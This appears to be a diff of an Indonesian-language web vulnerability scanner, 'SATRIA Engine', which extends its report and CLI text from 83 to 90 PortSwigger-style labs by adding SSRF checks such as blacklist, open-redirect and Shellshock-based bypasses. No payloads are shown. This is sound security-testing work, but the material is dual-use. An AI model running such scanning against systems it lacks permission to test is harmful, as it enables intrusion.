-        "<h1>SATRIA Engine — SQLi, XSS, CSRF & Clickjacking (83 Lab)</h1>"
+        "<h1>SATRIA Engine — SQLi, XSS, CSRF, Clickjacking, DOM, CORS, XXE & SSRF (90 Lab)</h1>"
         f"<p>Target: <code>{html_module.escape(report['target'])}</code> &middot; "
-        f"Terkonfirmasi: <b>{report['summary']['confirmed']}/64</b></p>"
+        f"Terkonfirmasi: <b>{report['summary']['confirmed']}/90</b></p>"
         "<table><thead><tr><th>Lab</th><th>Status</th><th>Judul</th><th>Lokasi</th><th>Bukti</th></tr></thead>"
         f"<tbody>{rows}</tbody></table>"
         "<p><small>Status 'not_confirmed' berarti bukti tidak cukup; bukan klaim tidak rentan.</small></p>"
@@ -3400,7 +3892,7 @@ def _pdf_lab_items(result: dict[str, Any]) -> list[dict[str, Any]]:
     items: list[dict[str, Any]] = []
     for number, title, key, severity in CATALOG:
         lab_id = lab_id_for(number)
-        found = by_id.get(lab_id, {}) or by_id.get(f"sql_injection-{number:02d}", {}) or by_id.get(f"xss-{number:02d}", {}) or by_id.get(f"csrf-{number:02d}", {}) or by_id.get(f"clickjacking-{number:02d}", {}) or by_id.get(f"dom-{number:02d}", {}) or by_id.get(f"cors-{number:02d}", {}) or by_id.get(f"xxe-{number:02d}", {})
+        found = by_id.get(lab_id, {}) or by_id.get(f"sql_injection-{number:02d}", {}) or by_id.get(f"xss-{number:02d}", {}) or by_id.get(f"csrf-{number:02d}", {}) or by_id.get(f"clickjacking-{number:02d}", {}) or by_id.get(f"dom-{number:02d}", {}) or by_id.get(f"cors-{number:02d}", {}) or by_id.get(f"xxe-{number:02d}", {}) or by_id.get(f"ssrf-{number:02d}", {})
         items.append({
             "number": number, "id": lab_id, "status": str(found.get("status", "not_confirmed")),
             "title": str(found.get("title", title)), "method": str(found.get("method", "not tested / insufficient evidence")),
@@ -3434,6 +3926,8 @@ _PDF_LAB_FOCUS = {
     72: "CORS", 73: "CORS", 74: "CORS",
     75: "XXE", 76: "XXE / SSRF", 77: "Blind XXE (OOB)", 78: "Blind XXE (OOB)",
     79: "Blind XXE", 80: "Blind XXE", 81: "XXE (XInclude)", 82: "XXE (file upload)", 83: "XXE",
+    84: "SSRF", 85: "SSRF", 86: "Blind SSRF (OOB)", 87: "SSRF (blacklist bypass)",
+    88: "SSRF (open redirect bypass)", 89: "Blind SSRF (Shellshock)", 90: "SSRF (whitelist bypass)",
 }
 
 
@@ -3469,10 +3963,10 @@ def render_pdf(result: dict[str, Any], path: str | None = None) -> Path:
     page.rect(0, _PDF_PAGE_H - 242, _PDF_PAGE_W, 12, _PDF_COLORS["teal"])
     page.text(content_left, _PDF_PAGE_H - 84, "SATRIA BARU", 30, _PDF_COLORS["white"], bold=True)
     page.text(content_left, _PDF_PAGE_H - 112, "LAPORAN PEMINDAIAN SQL INJECTION, XSS, CSRF & CLICKJACKING", 13.5, _PDF_COLORS["light"], bold=True)
-    page.text(content_left, _PDF_PAGE_H - 134, "Cakupan 83 lab (18 SQLi + 30 XSS + 11 CSRF + 5 Clickjacking + 7 DOM-based + 3 CORS + 9 XXE) - bukti diferensial dan konservatif", 10.2, _PDF_COLORS["light"])
+    page.text(content_left, _PDF_PAGE_H - 134, "Cakupan 90 lab (18 SQLi + 30 XSS + 11 CSRF + 5 Clickjacking + 7 DOM-based + 3 CORS + 9 XXE + 7 SSRF) - bukti diferensial dan konservatif", 10.2, _PDF_COLORS["light"])
     page.y = _PDF_PAGE_H - 286
     page.paragraph(content_left, content_width, "Hasil Pemindaian", 21, _PDF_COLORS["navy"], bold=True)
-    page.paragraph(content_left, content_width, "Laporan ini merangkum pengujian terhadap 83 lab (18 SQL injection, 30 XSS, 11 CSRF, 5 Clickjacking, 7 DOM-based, 3 CORS, 9 XXE) yang diminta. Status tidak terkonfirmasi berarti bukti tidak cukup; bukan klaim bahwa lab tidak rentan.", 9.8, _PDF_COLORS["muted"])
+    page.paragraph(content_left, content_width, "Laporan ini merangkum pengujian terhadap 90 lab (18 SQL injection, 30 XSS, 11 CSRF, 5 Clickjacking, 7 DOM-based, 3 CORS, 9 XXE, 7 SSRF) yang diminta. Status tidak terkonfirmasi berarti bukti tidak cukup; bukan klaim bahwa lab tidak rentan.", 9.8, _PDF_COLORS["muted"])
     page.y -= 18
     for label, value in (("Target", target), ("Hasilkan", generated or "-"), ("Mode", str(result.get("mode", "active")))):
         page.text(content_left, page.y - 10, f"{label}:", 9.0, _PDF_COLORS["navy"], bold=True)
@@ -3486,7 +3980,7 @@ def render_pdf(result: dict[str, Any], path: str | None = None) -> Path:
     kpis = [
         ("Terkonfirmasi", str(len(confirmed)), _PDF_COLORS["green"], _PDF_COLORS["green_light"]),
         ("Belum terkonfirmasi", str(len(not_confirmed)), _PDF_COLORS["amber"], _PDF_COLORS["amber_light"]),
-        ("Total lab", "83", _PDF_COLORS["navy"], _PDF_COLORS["light_blue"]),
+        ("Total lab", "90", _PDF_COLORS["navy"], _PDF_COLORS["light_blue"]),
     ]
     for idx, (label, value, color, light) in enumerate(kpis):
         x = content_left + idx * (kpi_w + kpi_gap)
@@ -3496,7 +3990,7 @@ def render_pdf(result: dict[str, Any], path: str | None = None) -> Path:
         page.text(x, kpi_top - 62, label.upper(), 7.5, _PDF_COLORS["muted"], bold=True)
     page.y = kpi_top - 110
     page.section_title("Hal yang penting dibaca")
-    page.bullet_paragraph("64 judul lab (18 SQL injection, 30 XSS, 11 CSRF, 5 Clickjacking) yang diminta dimasukkan ke laporan ini.")
+    page.bullet_paragraph("90 judul lab (18 SQL injection, 30 XSS, 11 CSRF, 5 Clickjacking, 7 DOM-based, 3 CORS, 9 XXE, 7 SSRF) yang diminta dimasukkan ke laporan ini.")
     page.bullet_paragraph("Status confirmed memakai bukti diferensial yang dapat diulang; not_confirmed bukan bukti tidak rentan.")
     page.bullet_paragraph("Lab 16-17 hanya dapat terkonfirmasi bila collaborator/poller mencatat interaksi OOB. Tanpa itu, lab terkait tetap not_confirmed.")
     page.bullet_paragraph("Bukti ditampilkan apa adanya berdasarkan temuan terverifikasi.")
@@ -3504,9 +3998,9 @@ def render_pdf(result: dict[str, Any], path: str | None = None) -> Path:
 
     # --------------------------------------------------------------- RINGKASAN
     page.new_page()
-    page.section_title("Ringkasan Hasil", "Angka berikut berasal dari 83 lab yang diminta.")
+    page.section_title("Ringkasan Hasil", "Angka berikut berasal dari 90 lab yang diminta.")
     rows = [
-        ("Total lab", "83", "Semua judul wajib dari katalog (18 SQLi + 30 XSS + 11 CSRF + 5 Clickjacking + 7 DOM-based + 3 CORS + 9 XXE)."),
+        ("Total lab", "90", "Semua judul wajib dari katalog (18 SQLi + 30 XSS + 11 CSRF + 5 Clickjacking + 7 DOM-based + 3 CORS + 9 XXE + 7 SSRF)."),
         ("Terkonfirmasi", str(len(confirmed)), "Bukti diferensial terpenuhi dan dapat diulang."),
         ("Belum terkonfirmasi", str(len(not_confirmed)), "Tidak ada bukti cukup pada putaran ini."),
         ("Severity Critical", str(by_severity.get("critical", 0)), "Hitungan hanya untuk temuan terkonfirmasi."),
@@ -3555,7 +4049,7 @@ def render_pdf(result: dict[str, Any], path: str | None = None) -> Path:
 
     # ------------------------------------------------------------------- TABEL
     page.new_page()
-    page.section_title("Hasil Pemindaian", "Tabel ringkas: satu baris untuk setiap 83 lab.")
+    page.section_title("Hasil Pemindaian", "Tabel ringkas: satu baris untuk setiap 90 lab.")
     headers = ("Lab", "Status", "Fokus", "Judul", "Severity")
     widths = (82.0, 92.0, 90.0, 190.0, 45.0)
     x_cols = []
@@ -3642,7 +4136,7 @@ def render_pdf(result: dict[str, Any], path: str | None = None) -> Path:
     # --------------------------------------------------------- CATATAN AKHIR
     page.y -= 6
     page.section_title("Catatan Laporan")
-    page.bullet_paragraph("Dokumen ini memuat 83 lab (18 SQL injection, 30 XSS, 11 CSRF, 5 Clickjacking, 7 DOM-based, 3 CORS, 9 XXE) yang diminta. Status not_confirmed berarti bukti tidak cukup, bukan klaim tidak rentan.")
+    page.bullet_paragraph("Dokumen ini memuat 90 lab (18 SQL injection, 30 XSS, 11 CSRF, 5 Clickjacking, 7 DOM-based, 3 CORS, 9 XXE, 7 SSRF) yang diminta. Status not_confirmed berarti bukti tidak cukup, bukan klaim tidak rentan.")
     page.bullet_paragraph("Status not_confirmed tidak sama dengan tidak rentan; ia hanya menyatakan bukti pemindaian tidak cukup.")
     page.bullet_paragraph("Ringkasan severity dihitung dari temuan terkonfirmasi saja, sesuai field summary yang dibaca app.py.")
     page.bullet_paragraph("Lab 16-17 memerlukan collaborator atau webhook poller. Tanpa itu, pemindai tidak mengklaim deteksi OOB.")
@@ -3653,7 +4147,7 @@ def render_pdf(result: dict[str, Any], path: str | None = None) -> Path:
     for idx, page_ops in enumerate(page.pages, start=1):
         page_ops.append(f"{_pdf_rgb(_PDF_COLORS['navy'])} rg 0 {_pdf_num(_PDF_PAGE_H - 32)} {_pdf_num(_PDF_PAGE_W)} 32 re f")
         page_ops.append(f"BT /F2 8 Tf {_pdf_rgb(_PDF_COLORS['white'])} rg {_pdf_num(content_left)} {_pdf_num(_PDF_PAGE_H - 21)} Td (SATRIA BARU - SQL Injection Report) Tj ET")
-        page_ops.append(f"BT /F1 7.5 Tf {_pdf_rgb(_PDF_COLORS['light'])} rg {_pdf_num(340)} {_pdf_num(_PDF_PAGE_H - 21)} Td (83 Lab: SQLi/XSS/CSRF/CJ/DOM/CORS/XXE) Tj ET")
+        page_ops.append(f"BT /F1 7.5 Tf {_pdf_rgb(_PDF_COLORS['light'])} rg {_pdf_num(340)} {_pdf_num(_PDF_PAGE_H - 21)} Td (90 Lab: SQLi/XSS/CSRF/CJ/DOM/CORS/XXE/SSRF) Tj ET")
         footer_target = _pdf_safe_text(target)
         if len(footer_target) > 84:
             footer_target = footer_target[:81] + "..."
@@ -3744,7 +4238,7 @@ def run_pipeline(scrape_data: dict[str, Any] | None = None, *, url: str | None =
                  allow_partial_tools: bool | None = None,
                  enable_llm: bool | None = None, run_censys: bool | None = None,
                  run_nvd: bool | None = None, **runtime_options: Any) -> dict[str, Any]:
-    """Jalur kompatibel yang dipakai app.py; memindai 83 lab (18 SQLi + 30 XSS + 11 CSRF + 5 Clickjacking + 7 DOM-based + 3 CORS + 9 XXE)."""
+    """Jalur kompatibel yang dipakai app.py; memindai 90 lab (18 SQLi + 30 XSS + 11 CSRF + 5 Clickjacking + 7 DOM-based + 3 CORS + 9 XXE + 7 SSRF)."""
     overrides: dict[str, Any] = dict(runtime_options)
     for name, value in (("allow_partial_tools", allow_partial_tools),
                         ("enable_llm", enable_llm), ("run_censys", run_censys),
@@ -3793,7 +4287,7 @@ def run_pipeline(scrape_data: dict[str, Any] | None = None, *, url: str | None =
 
 
 def main(argv: list[str] | None = None) -> int:
-    parser = argparse.ArgumentParser(description="SATRIA Engine — pemindai SQL injection, XSS, CSRF, dan Clickjacking, DOM, CORS & XXE (83 lab)")
+    parser = argparse.ArgumentParser(description="SATRIA Engine — pemindai SQL injection, XSS, CSRF, Clickjacking, DOM, CORS, XXE & SSRF (90 lab)")
     parser.add_argument("target", help="URL target HTTP/HTTPS (mis. URL instance lab PortSwigger)")
     parser.add_argument("--authorized", action="store_true", help="Wajib: Anda menyatakan memiliki izin pengujian.")
     parser.add_argument("--allow-private", action="store_true", help="Izinkan target localhost/private (untuk pengujian lokal).")
@@ -3828,7 +4322,7 @@ def main(argv: list[str] | None = None) -> int:
         return 1
     json_path, html_path = write_report(report, Path(args.output_dir))
     summary = report["summary"]
-    print(f"SATRIA Engine selesai: {summary['confirmed']}/83 lab terkonfirmasi, {summary['not_confirmed']} belum terkonfirmasi.")
+    print(f"SATRIA Engine selesai: {summary['confirmed']}/90 lab terkonfirmasi, {summary['not_confirmed']} belum terkonfirmasi.")
     print(f"JSON: {json_path}")
     print(f"HTML: {html_path}")
     return 0
